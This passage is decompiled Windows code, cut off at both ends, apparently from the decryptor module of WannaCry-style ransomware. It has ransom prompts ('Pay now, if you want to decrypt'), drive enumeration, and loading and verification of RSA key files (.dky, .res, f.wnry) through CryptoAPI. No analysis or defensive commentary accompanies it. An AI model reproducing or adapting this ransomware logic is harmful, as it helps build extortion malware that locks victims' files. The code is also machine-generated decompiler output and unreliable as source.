        LVar2 = SendMessageA((HWND)0x0,0,(WPARAM)wParam,lParam);
      } while (iVar8 < LVar2);
    }
    hMem = (LPCSTR)GlobalAlloc(2,iVar7 + 2);
    local_2ec = hMem;
    if (hMem != (LPCSTR)0x0) {
      local_2f0 = GlobalLock(hMem);
      if (local_2f0 == (LPVOID)0x0) {
        GlobalFree(hMem);
      }
      else {
        iVar8 = 0;
        iVar7 = 0;
        LVar2 = SendMessageA(*(HWND *)(param_1 + 0x80),0x1004,0,0);
        if (0 < LVar2) {
          do {
            lParam = 0;
            CVar1 = GetItemText((CListCtrl *)(param_1 + 0x60),(int)auStack738 + 2,iVar8);
            wParam = &this_004206e0;
            local_8 = (undefined *)0x3;
            operator_((CString *)&local_2e8,(char *)CONCAT31(extraout_var_00,CVar1));
            local_c = CONCAT31(local_c._1_3_,5);
            _CString((CString *)&local_2e8);
            WStack740 = DAT_0042179c;
            iVar5 = 0xb3;
            puVar9 = auStack738;
            while (iVar5 != 0) {
              iVar5 = iVar5 + -1;
              *puVar9 = 0;
              puVar9 = puVar9 + 1;
            }
            *(undefined2 *)puVar9 = 0;
            MultiByteToWideChar(0,0,local_2ec,-1,(LPWSTR)&WStack740,0x167);
            sVar4 = wcslen((wchar_t *)&WStack740);
            uVar6 = (sVar4 << 1) >> 2;
            puVar9 = (undefined4 *)&WStack740;
            puVar10 = (undefined4 *)(local_2f8 + iVar7);
            while (uVar6 != 0) {
              uVar6 = uVar6 - 1;
              *puVar10 = *puVar9;
              puVar9 = puVar9 + 1;
              puVar10 = puVar10 + 1;
            }
            uVar6 = sVar4 << 1 & 3;
            while (uVar6 != 0) {
              uVar6 = uVar6 - 1;
              *(undefined *)puVar10 = *(undefined *)puVar9;
              puVar9 = (undefined4 *)((int)puVar9 + 1);
              puVar10 = (undefined4 *)((int)puVar10 + 1);
            }
            sVar4 = wcslen((wchar_t *)&WStack740);
            iVar7 = iVar7 + sVar4 * 2;
            local_c = 0xffffffff;
            _CString((CString *)&local_2ec);
            iVar8 = iVar8 + 1;
            LVar2 = SendMessageA((HWND)0x0,0,(WPARAM)wParam,lParam);
            hMem = local_2ec;
            param_1 = local_2e8;
          } while (iVar8 < LVar2);
        }
        *(undefined2 *)((int)local_2f0 + iVar7) = 0;
        GlobalUnlock(hMem);
        EmptyClipboard();
        SetClipboardData(0xd,hMem);
      }
    }
    CloseClipboard();
  }
  *in_FS_OFFSET = local_c;
  return;
}

void __fastcall FUN_00403860(LPVOID param_1) {
  WPARAM wParam;
  LRESULT LVar1;
  HANDLE pvVar2;
  
  wParam = SendMessageA(*(HWND *)((int)param_1 + 0xc0),0x147,0,0);
  if (wParam == 0xffffffff) {
    AfxMessageBox(s_Please_select_a_host_to_decrypt__004206e4,0,0);
    return;
  }
  LVar1 = SendMessageA(*(HWND *)((int)param_1 + 0xc0),0x150,wParam,0);
  if (LVar1 != 0) {
    SendMessageA(*(HWND *)((int)param_1 + 0x80),0x1009,0,0);
    pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,
                          (LPTHREAD_START_ROUTINE)&lpStartAddress_004038e0,param_1,0,(LPDWORD)0x0);
    *(HANDLE *)((int)param_1 + 0xf4) = pvVar2;
  }
  return;
}

void __fastcall FUN_004038f0(void *param_1) {
  WPARAM wParam;
  LRESULT LVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  char *pcVar3;
  CHAR local_504 [32];
  undefined4 local_4e4 [310];
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_c = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &DAT_0041367b;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  FUN_00403eb0(param_1,0);
  wParam = SendMessageA(*(HWND *)((int)param_1 + 0xc0),0x147,0,0);
  if (wParam == 0xffffffff) goto LAB_004039e1;
  LVar1 = SendMessageA(*(HWND *)((int)param_1 + 0xc0),0x150,wParam,0);
  if (*(int *)(LVar1 + 8) == 0) {
    FUN_00403af0();
  }
  FUN_00401e90(local_4e4);
  local_4 = 0;
  sprintf(local_504,s__08X_dky_0041fb88,*(undefined4 *)(LVar1 + 8));
  iVar2 = FUN_00402020(local_4e4,local_504,&LAB_00403810,0);
  if (iVar2 == 0) {
    if (*(int *)(LVar1 + 8) == 0) {
      pcVar3 = s_Pay_now__if_you_want_to_decrypt_A_0042072c;
LAB_004039c8:
      AfxMessageBox(pcVar3,0x40,0);
    }
  }
  else {
    iVar2 = FUN_00403a20(local_4e4,LVar1);
    if (iVar2 != 0) {
      pcVar3 = s_All_your_files_have_been_decrypt_00420708;
      goto LAB_004039c8;
    }
  }
  local_4 = 0xffffffff;
  FUN_00401f30(local_4e4);
LAB_004039e1:
  FUN_00403eb0(param_1,1);
  CloseHandle(*(HANDLE *)((int)param_1 + 0xf4));
  *(undefined4 *)((int)param_1 + 0xf4) = 0;
  *in_FS_OFFSET = local_c;
  return;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 FUN_00403a20(void *param_1,int param_2)

{
  DWORD DVar1;
  UINT UVar2;
  BOOL BVar3;
  wchar_t *unaff_EBP;
  undefined4 unaff_ESI;
  int iVar4;
  undefined4 unaff_EDI;
  uint local_20;
  undefined4 local_1c;
  int local_18;
  int local_14;
  ULARGE_INTEGER local_10;
  ULARGE_INTEGER local_8;
  
  if (*(int *)(param_2 + 8) == 0) {
    DVar1 = GetLogicalDrives();
    iVar4 = 2;
    do {
      if ((DVar1 >> ((byte)iVar4 & 0x1f) & 1) != 0) {
        local_20 = DAT_0042075c & 0xffff0000 | (uint)(ushort)((short)iVar4 + 0x41);
        local_1c._2_2_ = (ushort)((uint)DAT_00420760 >> 0x10);
        local_1c._0_2_ = 0x5c;
        UVar2 = GetDriveTypeW((LPCWSTR)&local_20);
        if (UVar2 != 5) {
          BVar3 = GetDiskFreeSpaceExW((LPCWSTR)&local_20,&local_8,(PULARGE_INTEGER)&local_18,
                                      &local_10);
          if ((BVar3 != 0) && ((local_14 != 0 || (local_18 != 0)))) {
            local_1c = (uint)local_1c._2_2_ << 0x10;
            FUN_004026b0(param_1,(wchar_t *)&local_20,unaff_EDI,unaff_ESI,unaff_EBP);
          }
        }
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 0x1a);
    return 1;
  }
  return 1;
}

uint FUN_00403af0(void)

{
  char cVar1;
  byte bVar2;
  bool bVar3;
  FILE *_File;
  int iVar4;
  char *pcVar5;
  uint uVar6;
  undefined4 *puVar7;
  undefined4 *in_FS_OFFSET;
  int local_8d0;
  char local_8cc;
  undefined4 local_8cb;
  undefined4 local_4e4 [310];
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_c = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &DAT_0041369b;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  _File = fopen(s_f_wnry_00420764,(char *)&_Mode_0042076c);
  if (_File == (FILE *)0x0) {
    *in_FS_OFFSET = local_c;
    return 0;
  }
  FUN_00401e90(local_4e4);
  local_4 = 0;
  iVar4 = FUN_00402020(local_4e4,(LPCSTR)0x0,&LAB_00403810,0);
  if (iVar4 == 0) {
    local_4 = 0xffffffff;
    FUN_00401f30(local_4e4);
    *in_FS_OFFSET = local_c;
    return 0;
  }
  bVar2 = *(byte *)&_File->_flag;
  local_8d0 = 0;
joined_r0x00403ba4:
  if ((bVar2 & 0x10) == 0) {
    iVar4 = 0xf9;
    local_8cc = '\0';
    puVar7 = &local_8cb;
    while (iVar4 != 0) {
      iVar4 = iVar4 + -1;
      *puVar7 = 0;
      puVar7 = puVar7 + 1;
    }
    *(undefined2 *)puVar7 = 0;
    *(undefined *)((int)puVar7 + 2) = 0;
    pcVar5 = fgets(&local_8cc,999,_File);
    if (pcVar5 != (char *)0x0) {
      iVar4 = -1;
      pcVar5 = &local_8cc;
      do {
        if (iVar4 == 0) break;
        iVar4 = iVar4 + -1;
        cVar1 = *pcVar5;
        pcVar5 = pcVar5 + 1;
      } while (cVar1 != '\0');
      if (iVar4 != -2) {
        do {
          uVar6 = 0xffffffff;
          pcVar5 = &local_8cc;
          do {
            if (uVar6 == 0) break;
            uVar6 = uVar6 - 1;
            cVar1 = *pcVar5;
            pcVar5 = pcVar5 + 1;
          } while (cVar1 != '\0');
          if (*(char *)((int)&local_8d0 + ~uVar6 + 2) != '\r') {
            uVar6 = 0xffffffff;
            pcVar5 = &local_8cc;
            do {
              if (uVar6 == 0) break;
              uVar6 = uVar6 - 1;
              cVar1 = *pcVar5;
              pcVar5 = pcVar5 + 1;
            } while (cVar1 != '\0');
            if (*(char *)((int)&local_8d0 + ~uVar6 + 2) != '\n') goto LAB_00403c2c;
          }
          uVar6 = 0xffffffff;
          pcVar5 = &local_8cc;
          do {
            if (uVar6 == 0) break;
            uVar6 = uVar6 - 1;
            cVar1 = *pcVar5;
            pcVar5 = pcVar5 + 1;
          } while (cVar1 != '\0');
          *(undefined *)((int)&local_8d0 + ~uVar6 + 2) = 0;
        } while( true );
      }
      goto LAB_00403c55;
    }
  }
  fclose(_File);
  bVar3 = 0 < local_8d0;
  local_4 = 0xffffffff;
  FUN_00401f30(local_4e4);
  *in_FS_OFFSET = local_c;
  return (uint)bVar3;
LAB_00403c2c:
  iVar4 = -1;
  pcVar5 = &local_8cc;
  do {
    if (iVar4 == 0) break;
    iVar4 = iVar4 + -1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar5 + 1;
  } while (cVar1 != '\0');
  if ((iVar4 != -2) && (iVar4 = FUN_00402650(&local_8cc), iVar4 != 0)) {
    local_8d0 = local_8d0 + 1;
  }
LAB_00403c55:
  bVar2 = *(byte *)&_File->_flag;
  goto joined_r0x00403ba4;
}

undefined4 __fastcall FUN_00403cb0(int param_1)

{
  char cVar1;
  HANDLE hFindFile;
  FILE *_File;
  size_t sVar2;
  WPARAM wParam;
  int *lParam;
  BOOL BVar3;
  int iVar4;
  int *piVar5;
  char *pcVar6;
  int *piVar7;
  UINT Msg;
  int local_200;
  char local_1fc;
  undefined local_1fb;
  undefined4 local_1fa [12];
  int local_1c8 [34];
  byte local_140 [44];
  char local_114 [276];
  
  hFindFile = FindFirstFileA(s___res_0042077c,(LPWIN32_FIND_DATAA)local_140);
  if (hFindFile == (HANDLE)0xffffffff) {
    return 0;
  }
  do {
    if ((local_140[0] & 0x10) == 0) {
      iVar4 = -1;
      pcVar6 = local_114;
      do {
        if (iVar4 == 0) break;
        iVar4 = iVar4 + -1;
        cVar1 = *pcVar6;
        pcVar6 = pcVar6 + 1;
      } while (cVar1 != '\0');
      if (((iVar4 == -0xe) && (iVar4 = sscanf(local_114,s__08X_res_0041fb68,&local_200), 0 < iVar4))
         && (_File = fopen(local_114,(char *)&_Mode_0041fb84), _File != (FILE *)0x0)) {
        sVar2 = fread(local_1c8,0x88,1,_File);
        if ((sVar2 == 1) && (local_1c8[2] == local_200)) {
          if (local_200 == 0) {
            sprintf(&local_1fc,s_My_Computer_00420770);
            Msg = 0x14a;
          }
          else {
            local_1fb = 0x5c;
            local_1fc = '\\';
            FUN_00401c30(local_200,local_1fa);
            Msg = 0x143;
          }
          wParam = SendMessageA(*(HWND *)(param_1 + 0xc0),Msg,0,(LPARAM)&local_1fc);
          lParam = (int *)operator_new(0x88);
          iVar4 = 0x22;
          piVar5 = local_1c8;
          piVar7 = lParam;
          while (iVar4 != 0) {
            iVar4 = iVar4 + -1;
            *piVar7 = *piVar5;
            piVar5 = piVar5 + 1;
            piVar7 = piVar7 + 1;
          }
          SendMessageA(*(HWND *)(param_1 + 0xc0),0x151,wParam,(LPARAM)lParam);
        }
        fclose(_File);
      }
    }
    BVar3 = FindNextFileA(hFindFile,(LPWIN32_FIND_DATAA)local_140);
    if (BVar3 == 0) {
      FindClose(hFindFile);
      return 1;
    }
  } while( true );
}

void __thiscall FUN_00403e60(void *this,char *param_1)

{
  LRESULT LVar1;
  WPARAM wParam;
  
  LVar1 = SendMessageA(*(HWND *)((int)this + 0x80),0x1004,0,0);
  wParam = InsertItem((CListCtrl *)((int)this + 0x60),1,LVar1,param_1,0,0,0,0);
  SendMessageA(*(HWND *)((int)this + 0x80),0x1013,wParam,1);
  return;
}

void __thiscall FUN_00403eb0(void *this,int param_1)

{
  CWnd *this_00;
  int iVar1;
  
  iVar1 = param_1;
  this_00 = GetDlgItem((CWnd *)this,0x407);
  EnableWindow(this_00,iVar1);
  iVar1 = param_1;
  this_00 = GetDlgItem((CWnd *)this,0x408);
  EnableWindow(this_00,iVar1);
  this_00 = GetDlgItem((CWnd *)this,2);
  EnableWindow(this_00,param_1);
  return;
}

undefined4 * __thiscall FUN_00403f00(void *this,byte param_1)

{
  FUN_00403f20((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00403f20(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_004136b8;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x415c00;
  local_4 = 0;
  DeleteObject((CGdiObject *)param_1);
  *param_1 = 0x415bec;
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 * __thiscall FUN_00403f70(void *this,byte param_1)

{
  FUN_00403f90((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00403f90(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_004136d8;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x415c00;
  local_4 = 0;
  DeleteObject((CGdiObject *)param_1);
  *param_1 = 0x415bec;
  *in_FS_OFFSET = local_c;
  return;
}

undefined4 * __thiscall FUN_00403fe0(void *this,byte param_1)

{
  FUN_00404000((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00404000(undefined4 *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &LAB_004136f8;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x415c00;
  local_4 = 0;
  DeleteObject((CGdiObject *)param_1);
  *param_1 = 0x415bec;
  *in_FS_OFFSET = local_c;
  return;
}

CComboBox * __thiscall FUN_00404050(void *this,byte param_1)

{
  _CComboBox((CComboBox *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CComboBox *)this;
}

CListCtrl * __thiscall FUN_00404070(void *this,byte param_1)

{
  _CListCtrl((CListCtrl *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CListCtrl *)this;
}

// WARNING: Could not reconcile some variable overlaps

undefined4 * __fastcall FUN_00404090(undefined4 *param_1)

{
  CString *pCVar1;
  HCURSOR pHVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack8 = &LAB_00413739;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  CWnd((CWnd *)param_1);
  *param_1 = 0x415d70;
  local_4 = 0;
  CString((CString *)(param_1 + 0x10));
  local_4._0_1_ = 1;
  CString((CString *)(param_1 + 0x11));
  param_1[0x13] = 0;
  param_1[0x12] = 0x415a30;
  local_4 = CONCAT31(local_4._1_3_,3);
  *param_1 = 0x415cb0;
  pCVar1 = operator_((CString *)(param_1 + 0x11),(char *)&this_00421798);
  operator_((CString *)(param_1 + 0x10),pCVar1);
  *(undefined *)((int)param_1 + 0x5a) = 0;
  *(undefined *)(param_1 + 0x16) = 0;
  *(undefined *)((int)param_1 + 0x59) = 0;
  pHVar2 = LoadCursorA((HINSTANCE)0x0,(LPCSTR)0x7f89);
  *(HCURSOR *)(param_1 + 0x17) = pHVar2;
  pHVar2 = LoadCursorA((HINSTANCE)0x0,(LPCSTR)0x7f00);
  *(HCURSOR *)(param_1 + 0x18) = pHVar2;
  param_1[0x19] = 0xff0000;
  *in_FS_OFFSET = local_c;
  return param_1;
}

undefined4 * __thiscall FUN_00404150(void *this,byte param_1)

{
  FUN_00404170((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

// WARNING: Could not reconcile some variable overlaps

void __fastcall FUN_00404170(undefined4 *param_1)

{
  undefined4 *this;
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  puStack8 = &this_00413776;
  local_c = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  *param_1 = 0x415cb0;
  this = param_1 + 0x12;
  *this = 0x415c00;
  local_4._0_1_ = 3;
  local_4._1_3_ = 0;
  DeleteObject((CGdiObject *)this);
  *this = 0x415bec;
  local_4._0_1_ = 1;
  _CString((CString *)(param_1 + 0x11));
  local_4 = (uint)local_4._1_3_ << 8;
  _CString((CString *)(param_1 + 0x10));
  local_4 = 0xffffffff;
  _CStatic((CStatic *)param_1);
  *in_FS_OFFSET = local_c;
  return;
}

void __fastcall FUN_00404210(int param_1,undefined param_2,undefined1 param_3)

{
  undefined4 *in_FS_OFFSET;
  undefined4 local_c;
  CString **ppCStack8;
  undefined4 local_4;
  
  local_c = *in_FS_OFFSET;
  ppCStack8 = &this_00413788;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  local_4 = 0;
  operator_((CString *)(param_1 + 0x44),(CString *)&param_3);
  local_4 = 0xffffffff;
  _CString((CString *)&param_3);
  *in_FS_OFFSET = local_c;
  return;
}

void __thiscall FUN_00404260(void *this,undefined4 param_1)

{
  *(undefined4 *)((int)this + 100) = param_1;
  return;
}

void __thiscall FUN_00404270(void *this,CGdiObject *param_1)

{
  FUN_004044c0(this,param_1);
  return;
}

void __fastcall FUN_00404280(CWnd *param_1,undefined param_2,undefined param_3,undefined1 param_4)

{
  LPCSTR *this;
  LPCSTR lParam;
  char cVar1;
  int iVar2;
  HWND pHVar3;
  CWnd *pCVar4;
  
  if (param_1[0x5a] == (CWnd)0x0) {
    FUN_00404530(param_1);
  }
  cVar1 = FUN_004045e0(&param_4);
  if (cVar1 != '\0') {
    this = (LPCSTR *)(param_1 + 0x44);
    iVar2 = Find((CString *)this,s_mailto__0042078c,0);
    if (iVar2 == 0) {
      lParam = *this;
      pHVar3 = GetParent(*(HWND *)(param_1 + 0x20));
      pCVar4 = FromHandle((HWND__ *)pHVar3);
      SendMessageA(*(HWND *)(pCVar4 + 0x20),5000,*(WPARAM *)(param_1 + 0x20),(LPARAM)lParam);
      Default(param_1);
      return;
    }
    ShellExecuteA((HWND)0x0,(LPCSTR)&lpOperation_00420784,*this,(LPCSTR)0x0,(LPCSTR)0x0,1);
  }
  Default(param_1);
  return;
}

void __fastcall FUN_004043c0(CWnd *param_1)

{
  OnDestroy(param_1);
  DeleteObject((CGdiObject *)(param_1 + 0x48));
  return;
}

void __thiscall FUN_004044c0(void *this,CGdiObject *param_1)

{
  HWND pHVar1;
  CWnd *pCVar2;
  void *pvVar3;
  HFONT pHVar4;
  LOGFONTA local_3c;
  
  if (param_1 == (CGdiObject *)0x0) {
    pHVar1 = GetParent(*(HWND *)((int)this + 0x20));
    pCVar2 = FromHandle((HWND__ *)pHVar1);
    pvVar3 = (void *)SendMessageA(*(HWND *)(pCVar2 + 0x20),0x31,0,0);
    param_1 = FromHandle(pvVar3);
    if (param_1 == (CGdiObject *)0x0) {
      return;
    }
  }
  GetObjectA(*(HANDLE *)(param_1 + 4),0x3c,&local_3c);
  local_3c.lfUnderline = '\x01';
  pHVar4 = CreateFontIndirectA(&local_3c);
  Attach((CGdiObject *)((int)this + 0x48),pHVar4);
  *(undefined *)((int)this + 0x58) = 1;
  return;
}

void __fastcall FUN_00404530(CWnd *param_1)

{
  CFont *pCVar1;
  undefined4 *in_FS_OFFSET;
  tagSIZE local_28;
  CClientDC local_20 [8];
  HDC local_18;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  local_c = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &this_004137c8;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  if ((param_1[0x5a] == (CWnd)0x0) && (param_1[0x58] != (CWnd)0x0)) {
    CClientDC(local_20,param_1);
    local_4 = 0;
    pCVar1 = SelectObject((CDC *)local_20,(CFont *)(param_1 + 0x48));
    GetTextExtentPoint32A
              (local_18,*(LPCSTR *)(param_1 + 0x40),*(int *)(*(LPCSTR *)(param_1 + 0x40) + -8),
               (LPSIZE)&local_28);
    *(LONG *)(param_1 + 0x50) = local_28.cx;
    *(LONG *)(param_1 + 0x54) = local_28.cy;
    SelectObject((CDC *)local_20,pCVar1);
    param_1[0x5a] = (CWnd)0x1;
    local_4 = 0xffffffff;
    _CClientDC(local_20);
  }
  *in_FS_OFFSET = local_c;
  return;
}

uint __thiscall FUN_004045e0(int param_1,int *param_1_00)

{
  uint in_EAX;
  
  if (*(char *)(param_1 + 0x5a) == '\0') {
    return in_EAX & 0xffffff00;
  }
  if ((((-1 < *param_1_00) && (*param_1_00 < *(int *)(param_1 + 0x50))) && (-1 < param_1_00[1])) &&
     (param_1_00[1] < *(int *)(param_1 + 0x54))) {
    return 1;
  }
  return 0;
}

CStatic * __thiscall FUN_00404620(void *this,byte param_1)

{
  _CStatic((CStatic *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (CStatic *)this;
}

undefined4 * __fastcall FUN_00404640(undefined4 *param_1)

{
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  *param_1 = 0x415e30;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return param_1;
}

undefined4 * __thiscall FUN_00404670(void *this,byte param_1)

{
  FUN_00404690((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00404690(undefined4 *param_1)

{
  *param_1 = 0x415e30;
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return;
}

undefined4 __fastcall FUN_004046b0(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  do {
    iVar1 = (*DAT_004217c0)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x420c28,0x18,0xf0000000);
    if (iVar1 != 0) {
      return 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 2);
  return 0;
}

undefined4 __thiscall FUN_004046f0(void *this,LPCSTR param_1)

{
  int iVar1;
  
  iVar1 = FUN_004046b0((int)this);
  if (iVar1 == 0) {
    FUN_00404770((int)this);
    return 0;
  }
  if (param_1 == (LPCSTR)0x0) {
    iVar1 = (*DAT_004217c4)(*(undefined4 *)((int)this + 4),&DAT_00420794,0x494,0,0,(int)this + 8);
    if (iVar1 == 0) {
      FUN_00404770((int)this);
      return 0;
    }
  }
  else {
    iVar1 = FUN_004049b0(*(undefined4 *)((int)this + 4),(int)this + 8,param_1);
    if (iVar1 == 0) {
      FUN_00404770((int)this);
      return 0;
    }
  }
  return 1;
}

undefined4 __fastcall FUN_00404770(int param_1)

{
  if (*(int *)(param_1 + 8) != 0) {
    (*DAT_004217c8)(*(int *)(param_1 + 8));
    *(undefined4 *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 0xc) != 0) {
    (*DAT_004217c8)(*(int *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
    *(undefined4 *)(param_1 + 4) = 0;
  }
  return 1;
}

undefined4 __thiscall FUN_004047c0(void *this,LPCSTR param_1,LPCSTR param_2)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined4 *in_FS_OFFSET;
  int local_22c;
  undefined4 local_228;
  undefined4 local_224;
  char local_220;
  undefined local_21f;
  undefined local_21c [3];
  undefined auStack537 [517];
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &DAT_00415e38;
  puStack16 = &DAT_00413050;
  local_14 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_14;
  local_228 = s_TESTDATA_00420c60._0_4_;
  local_224 = s_TESTDATA_00420c60._4_4_;
  local_220 = s_TESTDATA_00420c60[8];
  local_21f = 0;
  local_21c[0] = '\0';
  iVar2 = 0x7f;
  puVar5 = (undefined4 *)(local_21c + 1);
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  uVar3 = 0xffffffff;
  puVar5 = &local_228;
  do {
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    cVar1 = *(char *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
  } while (cVar1 != '\0');
  local_22c = ~uVar3 - 1;
  iVar2 = FUN_004046b0((int)this);
  if (iVar2 != 0) {
    local_8 = 0;
    iVar2 = FUN_004049b0(*(undefined4 *)((int)this + 4),(int)this + 8,param_1);
    if ((iVar2 != 0) &&
       (iVar2 = FUN_004049b0(*(undefined4 *)((int)this + 4),(int)this + 0xc,param_2), iVar2 != 0)) {
      uVar3 = 0xffffffff;
      puVar5 = &local_228;
      do {
        puVar6 = puVar5;
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        puVar6 = (undefined4 *)((int)puVar5 + 1);
        cVar1 = *(char *)puVar5;
        puVar5 = puVar6;
      } while (cVar1 != '\0');
      uVar3 = ~uVar3;
      uVar4 = uVar3 >> 2;
      puVar5 = (undefined4 *)((int)puVar6 - uVar3);
      puVar6 = (undefined4 *)local_21c;
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        *puVar6 = *puVar5;
        puVar5 = puVar5 + 1;
        puVar6 = puVar6 + 1;
      }
      uVar3 = uVar3 & 3;
      while (uVar3 != 0) {
        uVar3 = uVar3 - 1;
        *(undefined *)puVar6 = *(undefined *)puVar5;
        puVar5 = (undefined4 *)((int)puVar5 + 1);
        puVar6 = (undefined4 *)((int)puVar6 + 1);
      }
      iVar2 = (*DAT_004217cc)(*(undefined4 *)((int)this + 8),0,1,0,local_21c,&local_22c,0x200);
      if ((iVar2 != 0) &&
         (iVar2 = (*DAT_004217d0)(*(undefined4 *)((int)this + 0xc),0,1,0,local_21c,&local_22c),
         iVar2 != 0)) {
        uVar3 = 0xffffffff;
        puVar5 = &local_228;
        do {
          if (uVar3 == 0) break;
          uVar3 = uVar3 - 1;
          cVar1 = *(char *)puVar5;
          puVar5 = (undefined4 *)((int)puVar5 + 1);
        } while (cVar1 != '\0');
        iVar2 = strncmp(local_21c,(char *)&local_228,~uVar3 - 1);
        if (iVar2 == 0) {
          _local_unwind2(&local_14,0xffffffff);
          *in_FS_OFFSET = local_14;
          return 1;
        }
        local_8 = 0xffffffff;
        FUN_004049a6();
        goto LAB_004048f3;
      }
    }
    _local_unwind2(&local_14,0xffffffff);
  }
LAB_004048f3:
  *in_FS_OFFSET = local_14;
  return 0;
}

void FUN_004049a6(void)

{
  int unaff_EBX;
  
  FUN_00404770(unaff_EBX);
  return;
}

undefined4 __cdecl FUN_004049b0(undefined4 param_1,undefined4 param_2,LPCSTR param_3)

{
  HANDLE hFile;
  DWORD dwBytes;
  HGLOBAL lpBuffer;
  BOOL BVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  DWORD local_20 [3];
  undefined4 local_14;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_00415e48;
  puStack16 = &DAT_00413050;
  local_14 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &local_14;
  local_20[0] = 0;
  local_8 = 0;
  hFile = CreateFileA(param_3,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    dwBytes = GetFileSize(hFile,(LPDWORD)0x0);
    if (dwBytes == 0xffffffff) goto LAB_00404ac7;
    if (0x19000 < dwBytes) {
      dwBytes = 0xffffffff;
      goto LAB_00404ac7;
    }
    lpBuffer = GlobalAlloc(0,dwBytes);
    if (lpBuffer != (HGLOBAL)0x0) {
      BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,(LPOVERLAPPED)0x0);
      if (BVar1 == 0) {
        dwBytes = 0xffffffff;
        goto LAB_00404ac7;
      }
      iVar2 = (*DAT_004217c4)(param_1,lpBuffer,local_20[0],0,0,param_2);
      if (iVar2 != 0) {
        _local_unwind2(&local_14,0xffffffff);
        *in_FS_OFFSET = local_14;
        return 1;
      }
    }
  }
  dwBytes = 0xffffffff;
LAB_00404ac7:
  _local_unwind2(&local_14,dwBytes);
  *in_FS_OFFSET = local_14;
  return 0;
}

undefined4 __thiscall FUN_00404af0(void *this,undefined4 *param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  int iVar1;
  uint uVar2;
  undefined4 *unaff_ESI;
  undefined4 *unaff_EDI;
  undefined *puVar3;
  
  if (*(int *)((int)this + 8) == 0) {
    return 0;
  }
  lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
  EnterCriticalSection(lpCriticalSection);
